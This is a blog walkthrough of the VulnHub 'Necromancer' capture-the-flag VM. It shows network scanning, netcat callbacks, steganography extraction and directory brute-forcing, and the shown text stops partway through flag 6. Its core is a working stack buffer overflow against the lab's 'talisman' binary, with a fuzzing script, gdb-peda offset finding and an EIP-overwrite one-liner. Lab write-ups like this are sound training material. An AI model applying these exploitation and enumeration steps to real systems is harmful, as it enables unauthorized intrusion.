---
layout: post
title:  "Vulnhub - Necromancer"
date:   2016-09-01 15:07:19
categories: [walkthrough]
comments: false
---
Looking through the more recent VulnHub entries I came across [Necromancer](https://www.vulnhub.com/entry/the-necromancer-1,154/) written by [xerubus](https://www.vulnhub.com/author/xerubus,117/), sounded interesting enough so I decided to take a stab at it.

Quite fun, some pretty neat tricks in it.
<!--more-->

Description:  The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition.

There are 11 flags to collect on your way to solving the challenging, and the difficulty level is considered as beginner.

The end goal is simple... destroy The Necromancer!

So downloaded the VM, got it up and running setup on the same network as my Kali box, off to the races.

## Host Discovery

First up, lets figure out what IP it is running under as it was configured with Host-Only I chose to enumerate only that network:

{% highlight bash %}
root@kali:~/evidence/necromancer# netdiscover -r 192.168.92.0/24
4 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 240                                     
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------                       
192.168.92.1    00:50:56:c0:00:01      1      60  VMware, Inc.                                      
192.168.92.138  00:0c:29:f0:40:c9      2     120  VMware, Inc.                                      
192.168.92.254  00:50:56:f5:5a:12      1      60  VMware, Inc.                                      
root@kali:~/evidence/necromancer# -
{% endhighlight %}

There we go, `` time to enumerate.

## Host Enumeration

Starting off, lets use nmap.

{% highlight bash %}
root@kali:~/evidence/necromancer# nmap -sV -p 0-65535 192.168.92.138

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-20 08:17 MDT
Nmap scan report for 192.168.92.138
Host is up (0.00018s latency).
All 65536 scanned ports on 192.168.92.138 are filtered
MAC Address: 00:0C:29:F0:40:C9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1320.98 seconds
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Interesting, nothing comes up.  Lets try something passive.

## Sniffing with tcpdump

Ok, lets try tcpdump to see if we see something on the network.


{% highlight bash %}
root@kali:~/evidence/necromancer# tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
08:42:14.559195 IP 192.168.92.138.27582 > 192.168.92.1.4444: tcp 0
E..@S.@.@.....\...\.k..\Y`........@..>.................
..".....
08:42:25.574468 IP 192.168.92.138.48166 > 192.168.92.1.4444: tcp 0
E..@.{@.@..`..\...\..&.\<..G......@....................
.eAS....
08:42:25.819977 IP 192.168.92.138.41213 > 192.168.92.144.4444: tcp 0
E..@. @.@.'',..\...\....\O..<......@.c0.................
=.-,....
08:42:25.820000 IP 192.168.92.144.4444 > 192.168.92.138.41213: tcp 0
E..(..@.@.CW..\...\..\......O..=P.......
^C
4 packets captured
4 packets received by filter
0 packets dropped by kernel

root@kali:~/evidence/necromancer#  -
{% endhighlight %}

Looks like `192.168.92.138` is trying to connect to my system on `TCP/4444`.  Lets listen!

## Flag 1 - Netcat Listener

We saw in the packet capture that the system is connecting to port 4444, lets open up a listener.

{% highlight bash %}
root@kali:~/evidence/necromancer# nc -lvp 4444
listening on [any] 4444 ...
192.168.92.138: inverse host lookup failed: Unknown host
connect to [192.168.92.144] from (UNKNOWN) [192.168.92.138] 21742
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

root@kali:~/evidence/necromancer# -
{% endhighlight %}

So we got a bunch of data spit back, and outside of the ... that start and end it, it looks suspiciously like Base64 encoding to me.  Lets see if that works to decipher this.

{% highlight bash %}
root@kali:~/evidence/necromancer# echo "V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi" | base64 -d
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest.
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Looks like the flag1 string is a decrypt-able hash and then want us to "chant" it to u666.  I take that as use netcat's UDP mode to connect to `UDP/666`.  So lets get that hash decrypted.  For that I went to [hashkiller.co.uk](https://hashkiller.co.uk/md5-decrypter.aspx) and entered the hash.  `opensesame`, how appropriate.

## Flag 2 - UDP Netcat

{% highlight bash %}
root@kali:~/evidence/necromancer# nc -u 192.168.92.138 666
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
^C
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Taking a guess, Port 80 is now open.  Went ahead and decrypted the hash as well just in case 1033750779, but it doesn't seem to have an obvious meaning yet.

## Flag 3 - TCP/80 (HTTP)

Opening up a web browser we get some text and a picture.  Lets look at the code to see if anything is hidden in plain sight.

{% highlight html %}
<html>
  <head>
    <title>The Chasm</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    Hours have passed since you first started to follow the crows.<br><br>
    Silence continues to engulf you as you treck towards a mountain range on the horizon.<br><br>
    More times passes and you are now standing in front of a great chasm.<br><br>
    Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.<br><br>
    As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.<br><br>
    The necromancer looks towards you with hollow eyes which can only be described as death.<br><br>
    He smirks in your direction, and suddenly a bright light momentarily blinds you.<br><br>
    The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!<br><br>
    The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.<br><br>
    The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.<br><br>
    <img src="/pics/pileoffeathers.jpg">
    <p><font size=2>Image copyright: <a href="http://www.featherfolio.com/" target=_blank>Chris Maynard</a></font></p>
    </font>
  </body>
</html>
{% endhighlight %}

Nothing of particular interest in the code.  Download the jpg and lets look through it with exiftool and binwalk.

{% highlight bash %}
root@kali:~/evidence/necromancer# wget http://192.168.92.138/pics/pileoffeathers.jpg
--2016-09-20 08:53:37--  http://192.168.92.138/pics/pileoffeathers.jpg
Connecting to 192.168.92.138:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 37289 (36K) [image/jpeg]
Saving to: ‘pileoffeathers.jpg’

pileoffeathers.jpg        100%[===================================>]  36.42K  --.-KB/s    in 0.001s  

2016-09-20 08:53:37 (36.4 MB/s) - ‘pileoffeathers.jpg’ saved [37289/37289]

root@kali:~/evidence/necromancer# exiftool pileoffeathers.jpg
ExifTool Version Number         : 10.25
File Name                       : pileoffeathers.jpg
Directory                       : .
File Size                       : 36 kB
File Modification Date/Time     : 2016:05:09 05:44:22-06:00
File Access Date/Time           : 2016:09:20 08:53:37-06:00
File Inode Change Date/Time     : 2016:09:20 08:53:37-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Quality                         : 60%
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:9678990A5A7D11E293DFC864BA726A9F
Document ID                     : xmp.did:9678990B5A7D11E293DFC864BA726A9F
Derived From Instance ID        : xmp.iid:967899085A7D11E293DFC864BA726A9F
Derived From Document ID        : xmp.did:967899095A7D11E293DFC864BA726A9F
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 640
Image Height                    : 290
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 640x290
Megapixels                      : 0.186
root@kali:~/evidence/necromancer# binwalk -e pileoffeathers.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, EXIF standard
12            0xC             TIFF image data, little-endian offset of first image directory: 8
270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"> <rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:xmpMM="http
36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
37267         0x9193          End of Zip archive

root@kali:~/evidence/necromancer# -
{% endhighlight %}

Nothing of interest in the meta-data, however something quite interesting in the binwalk!

{% highlight bash %}
root@kali:~/evidence/necromancer# ls
pileoffeathers.jpg  _pileoffeathers.jpg.extracted
root@kali:~/evidence/necromancer# ls _pileoffeathers.jpg.extracted/ -al
total 16
drwxr-xr-x 2 root root 4096 Sep 20 08:53 .
drwxr-xr-x 3 root root 4096 Sep 20 08:53 ..
-rw-r--r-- 1 root root  295 Sep 20 08:53 9082.zip
-rw-r--r-- 1 root root  125 May  8 19:39 feathers.txt
root@kali:~/evidence/necromancer# cat _pileoffeathers.jpg.extracted/feathers.txt
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
root@kali:~/evidence/necromancer# cat _pileoffeathers.jpg.extracted/feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
root@kali:~/evidence/necromancer# -
{% endhighlight %}

The `-e` parameter which we ran binwalk in went ahead and extracted concatenated data, which was a zip file and then extracted it for us as feathers.txt.  After that the content looked like Base64 again (the == being a giveaway in this case) so a quite pipe through `base64 -d` and we get flag 3, along with a path: `/amagicbridgeappearsatthechasm`.  Back to the website!

## Flag 4 - gdb goodness

We are greeted with more narration and another image.  

Looking at the code we again do not find anything of interest.

{% highlight html %}
<html>
  <head>
    <title>The Cave</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    You cautiously make your way across chasm.<br><br>
    You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.<br><br>
    The cave before you is protected by some sort of spell cast by the necromancer.<br><br>
    You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.<br><br>
    Hastily you take a few steps back away from the cave entrance.<br><br>
    There must be a magical item that could protect you from the necromancer's spell.<br><br>
    <img src="../pics/magicbook.jpg">
    </font>
  </body>
</html>
{% endhighlight %}

Perhaps the picture again?

{% highlight bash %}
root@kali:~/evidence/necromancer# wget http://192.168.92.138/pics/magicbook.jpg
--2016-09-20 08:59:28--  http://192.168.92.138/pics/magicbook.jpg
Connecting to 192.168.92.138:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 158080 (154K) [image/jpeg]
Saving to: ‘magicbook.jpg’

magicbook.jpg             100%[===================================>] 154.38K  --.-KB/s    in 0.003s  

2016-09-20 08:59:28 (49.4 MB/s) - ‘magicbook.jpg’ saved [158080/158080]

root@kali:~/evidence/necromancer# exiftool magicbook.jpg
ExifTool Version Number         : 10.25
File Name                       : magicbook.jpg
Directory                       : .
File Size                       : 154 kB
File Modification Date/Time     : 2016:05:09 05:53:24-06:00
File Access Date/Time           : 2016:09:20 08:59:28-06:00
File Inode Change Date/Time     : 2016:09:20 08:59:28-06:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 600
Image Height                    : 450
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 600x450
Megapixels                      : 0.270
root@kali:~/evidence/necromancer# binwalk -e magicbook.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

root@kali:~/evidence/necromancer# -
{% endhighlight %}

Nope. The only lead is the text staying 'There must be a magical item that could protect you from the necromancer's spell.'  Lets try enumerating pages on the website and see if something comes up.

{% highlight bash %}
root@kali:~/evidence/necromancer# dirb http://192.168.92.138/amagicbridgeappearsatthechasm/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 20 09:05:07 2016
URL_BASE: http://192.168.92.138/amagicbridgeappearsatthechasm/
WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

-----------------

GENERATED WORDS: 81628                                                         

---- Scanning URL: http://192.168.92.138/amagicbridgeappearsatthechasm/ ----
+ http://192.168.92.138/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)                  

-----------------
END_TIME: Tue Sep 20 09:15:16 2016
DOWNLOADED: 81628 - FOUND: 1
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Nice! `/amagicbridgeappearsatthechasm/talisman` should work.  Going there results in a binary file being downloaded.  Time to run file on it and see what it is.

{% highlight bash %}
root@kali:~/evidence/necromancer# file talisman
talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped
root@kali:~/evidence/necromancer# chmod +x ./talisman
root@kali:~/evidence/necromancer# ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it''s surface.

Do you want to wear the talisman?  yes

Nothing happens.



root@kali:~/evidence/necromancer# -
{% endhighlight %}

Very cool, ELF32 executable but it doesn't seem to do what we want.  Well thankfully I've been learning a bit of debugging and exploitation so lets give it a try.  First off lets see if we can cause it to crash since it accepts input.  Going to start off low, say 100 A's.

{% highlight bash %}
root@kali:~/evidence/necromancer# python -c 'print "A"*100' |  ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it''s surface.

Do you want to wear the talisman?  
Nothing happens.



Segmentation fault
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Excellent, lets see if a dump has any value.  (As the dump is quite large I've trimmed it down a bit to the interesting parts)

{% highlight bash %}
root@kali:~/evidence/necromancer# objdump -d talisman

talisman:     file format elf32-i386


Disassembly of section .init:

080482d0 <_init>:
 80482d0:	53                   	push   %ebx
 80482d1:	83 ec 08             	sub    $0x8,%esp
 80482d4:	e8 a7 00 00 00       	call   8048380 <__x86.get_pc_thunk.bx>
 80482d9:	81 c3 9b 25 00 00    	add    $0x259b,%ebx
 80482df:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax
 80482e5:	85 c0                	test   %eax,%eax
 80482e7:	74 05                	je     80482ee <_init+0x1e>
 80482e9:	e8 52 00 00 00       	call   8048340 <__isoc99_scanf@plt+0x10>
 80482ee:	83 c4 08             	add    $0x8,%esp
 80482f1:	5b                   	pop    %ebx
 80482f2:	c3                   	ret    

... removed ...

08048529 <wearTalisman>:
 8048529:	55                   	push   %ebp
 804852a:	89 e5                	mov    %esp,%ebp
 804852c:	57                   	push   %edi
 804852d:	81 ec b4 01 00 00    	sub    $0x1b4,%esp

... removed ...

08048a37 <chantToBreakSpell>:
 8048a37:	55                   	push   %ebp
 8048a38:	89 e5                	mov    %esp,%ebp
 8048a3a:	57                   	push   %edi
 8048a3b:	81 ec 54 03 00 00    	sub    $0x354,%esp
 8048a41:	8d 95 b0 fc ff ff    	lea    -0x350(%ebp),%edx
 8048a47:	b8 00 00 00 00       	mov    $0x0,%eax
 8048a4c:	b9 d2 00 00 00       	mov    $0xd2,%ecx
 8048a51:	89 d7                	mov    %edx,%edi
 8048a53:	f3 ab                	rep stos %eax,%es:(%edi)

... removed Lots of data here ...

08049594 <_fini>:
 8049594:	53                   	push   %ebx
 8049595:	83 ec 08             	sub    $0x8,%esp
 8049598:	e8 e3 ed ff ff       	call   8048380 <__x86.get_pc_thunk.bx>
 804959d:	81 c3 d7 12 00 00    	add    $0x12d7,%ebx
 80495a3:	83 c4 08             	add    $0x8,%esp
 80495a6:	5b                   	pop    %ebx
 80495a7:	c3                   	ret    
root@kali:~/evidence/necromancer# -  
{% endhighlight %}

Ok through all that assembler code I did notice that there is a procedure named `chantToBreakSpell` sounds like a place I would like to JMP to, and its at address `0x08048a37`.  Ok now to fuzz it to see how much data is needed to crash it.   I created a quick down and dirty python script to do this:

{% highlight python %}
#!/bin/python
import os;

for i in range(10,100,10):
        a="A"*i+"BBBB"+"CCCC"
        print "--------------------------------------------------------------"
        print "- " + str(i) + " A's"
        ret = os.system("echo " + a + " | ./talisman")
        if ret <> 0:
                break  
{% endhighlight %}

Ran it and found that it segfaults at 30.

{% highlight bash %}
root@kali:~/evidence/necromancer# python fuzz.py
--------------------------------------------------------------
- 10 A's
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.



--------------------------------------------------------------
- 20 A's
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.



--------------------------------------------------------------
- 30 A's
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  
Nothing happens.



Segmentation fault
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Ok no we have a rough idea where it crashes, lets debug using gdb.  I have also installed PEDA - Python Exploit Development Assistance for GDB which is available on [github](https://github.com/longld/peda).  PEDA is an amazing add-on to gdb allowing for cyclic patterns and memory searching similar to Mona.  Good stuff.  So the goal is to create a pattern that is a little larger than necessary to crash, and see if we control EIP.

{% highlight bash %}
root@kali:~/evidence/necromancer# gdb ./talisman
GNU gdb (Debian 7.11.1-2) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./talisman...(no debugging symbols found)...done.
gdb-peda$ pattern_create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
gdb-peda$ r
Starting program: /root/evidence/necromancer/talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it''s surface.

Do you want to wear the talisman?  AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa

Nothing happens.




Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0xffffd25d --> 0xf2
EBX: 0x0
ECX: 0x8
EDX: 0xa13cf2
ESI: 0xf7fb0000 --> 0x1aedb0
EDI: 0x44414128 ('(AAD')
EBP: 0x413b4141 ('AA;A')
ESP: 0xffffd2d0 ("EAAa")
EIP: 0x41412941 ('A)AA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412941
[------------------------------------stack-------------------------------------]
0000| 0xffffd2d0 ("EAAa")
0004| 0xffffd2d4 --> 0xffffd200 --> 0xcf5d9fc6
0008| 0xffffd2d8 --> 0x0
0012| 0xffffd2dc --> 0xf7e195f7 (<__libc_start_main+247>:	add    esp,0x10)
0016| 0xffffd2e0 --> 0xf7fb0000 --> 0x1aedb0
0020| 0xffffd2e4 --> 0xf7fb0000 --> 0x1aedb0
0024| 0xffffd2e8 --> 0x0
0028| 0xffffd2ec --> 0xf7e195f7 (<__libc_start_main+247>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412941 in ?? ()
gdb-peda$ pattern_search
Registers contain pattern buffer:
EDI+0 found at offset: 24
EIP+0 found at offset: 32
EBP+0 found at offset: 28
Registers point to pattern buffer:
[ESP] --> offset 36 - size ~4
Pattern buffer found at:
0x0804b411 : offset    1 - size   39 ([heap])
0xffffd2ac : offset    0 - size   40 ($sp + -0x24 [-9 dwords])
References to pattern buffer found at:
0xf7fb05a8 : 0x0804b411 (/lib32/libc-2.23.so)
0xffffd0b4 : 0xffffd2ac ($sp + -0x21c [-135 dwords])
0xffffd0f4 : 0xffffd2ac ($sp + -0x1dc [-119 dwords])
0xffffd104 : 0xffffd2ac ($sp + -0x1cc [-115 dwords])
gdb-peda$ -
{% endhighlight %}

Awesome, The pattern is in EIP at offset 32!  If we overwrite EIP with a memory address we want to go to it (and is allowed to go to) should continue to run as normal.  Shall we try the memory address for `<chantToBreakSpell>` at `08048a37`.  Now we need to take endian into consideration, so as we are on a little endian system we need those bytes backwards.

I went ahead and ran the final exploit from the command line echoing the exploit string as follows:

{% highlight bash %}
root@kali:~/evidence/necromancer# python -c 'print "A"*32+"\x37\x8a\x04\x08";' | ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it''s surface.

Do you want to wear the talisman?  
Nothing happens.



!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Segmentation fault
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Still segfaults of course, but now we get flag4!  Decrypting this flag gains us the next chant `blackmagic`.

## Flag5

Once again to netcat and connect to UDP 31337 while chanting `blackmagic`.

{% highlight bash %}
root@kali:~/evidence/necromancer# echo "blackmagic" | nc -u 192.168.92.138 31337


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}

^C
root@kali:~/evidence/necromancer# -
{% endhighlight %}

We are presented with another path, as the only place we have had to enter paths is the website we continue there.

## Flag6

Surfing to `view-source:http://192.168.92.138/thenecromancerwillabsorbyoursoul/` results in more cool narrative, flag6 and a pretty cool warlock image.

{% highlight html %}
<html>
  <head>
    <title>The Door</title>
  </head>
  <body bgcolor="#000000" link="green" vlink="green" alink="green">
    <font color="green">
    flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}<br><br>
    You continue to make your way through the cave.<br><br>
    In the distance you can see a familiar flicker of light moving in and out of the shadows. <br><br>
    As you get closer to the light you can hear faint footsteps, followed by the sound of a heavy door opening.<br><br>
    You move closer, and then stop frozen with fear.<br><br>
